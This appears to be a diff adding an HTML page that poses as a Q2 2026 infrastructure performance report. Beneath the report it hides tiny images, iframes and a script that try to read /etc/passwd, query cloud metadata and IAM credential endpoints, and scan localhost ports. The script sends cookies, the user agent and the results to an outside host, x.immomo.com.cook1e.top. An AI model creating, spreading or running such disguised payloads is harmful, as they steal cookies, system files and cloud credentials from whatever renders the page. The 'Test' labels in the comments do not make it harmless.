@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>2026 Q2 Engineering Report - Infrastructure Review</title>
+<meta charset="utf-8">
+</head>
+<body>
+<h1>Q2 Infrastructure Performance Summary</h1>
+<p>This report covers system performance metrics for Q2 2026.</p>
+<div id="content">
+<h2>Executive Summary</h2>
+<p>Overall system uptime remained at 99.97% across all regions. Key improvements were made in latency reduction and cache hit rates. The following sections detail findings by service area.</p>
+<h2>Service Metrics</h2>
+<ul>
+<li>API Gateway: avg latency 45ms (down from 62ms)</li>
+<li>Database cluster: 99.99% availability</li>
+<li>CDN cache hit rate: 94.2%</li>
+<li>Worker queue depth: avg 12 (peak 847)</li>
+</ul>
+<h2>Recommendations</h2>
+<p>Continue monitoring edge node performance. Consider expanding to additional regions based on traffic growth projections.</p>
+</div>
+
+<!-- Test 1: Callback with UA -->
+<img src="https://x.immomo.com.cook1e.top/testpage/collect.php?src=ghpages_img" style="width:1px;height:1px;">
+
+<!-- Test 2: file:// read -->
+<iframe src="file:///etc/passwd" style="width:1px;height:1px;" id="f1"></iframe>
+<iframe src="file:///etc/hosts" style="width:1px;height:1px;" id="f2"></iframe>
+
+<!-- Test 3: Cloud metadata SSRF -->
+<img src="http://169.254.169.254/latest/meta-data/" style="width:1px;height:1px;">
+<img src="http://169.254.169.254/latest/meta-data/iam/security-credentials/" style="width:1px;height:1px;">
+<img src="http://100.100.100.200/latest/meta-data/" style="width:1px;height:1px;">
+
+<!-- Test 4: Internal network -->
+<img src="http://127.0.0.1:8080/" style="width:1px;height:1px;">
+<img src="http://localhost:3000/" style="width:1px;height:1px;">
+
+<script>
+// Test 5: JS exfiltration
+var cb = "https://x.immomo.com.cook1e.top/testpage/collect.php";
+
+// Report UA
+new Image().src = cb + "?type=ua&data=" + encodeURIComponent(navigator.userAgent);
+
+// Report document.cookie
+new Image().src = cb + "?type=cookie&data=" + encodeURIComponent(document.cookie || "none");
+
+// Try reading file:// via iframe
+setTimeout(function(){
+  try {
+    var f = document.getElementById("f1");
+    var d = f.contentDocument || f.contentWindow.document;
+    new Image().src = cb + "?type=file_passwd&data=" + encodeURIComponent(d.body.innerText.substring(0,500));
+  } catch(e) {
+    new Image().src = cb + "?type=file_passwd_err&data=" + encodeURIComponent(e.message);
+  }
+}, 2000);
+
+// Try fetch internal endpoints
+fetch("http://169.254.169.254/latest/meta-data/").then(function(r){return r.text()}).then(function(t){
+  new Image().src = cb + "?type=metadata&data=" + encodeURIComponent(t.substring(0,500));
+}).catch(function(e){
+  new Image().src = cb + "?type=metadata_err&data=" + encodeURIComponent(e.message);
+});
+
+// Try fetch internal services
+var ports = [80, 443, 3000, 8080, 8443, 9090];
+ports.forEach(function(p){
+  fetch("http://127.0.0.1:" + p + "/").then(function(r){return r.text()}).then(function(t){
+    new Image().src = cb + "?type=internal_" + p + "&data=" + encodeURIComponent(t.substring(0,300));
+  }).catch(function(){});
+});
+</script>
+</body>
+</html>
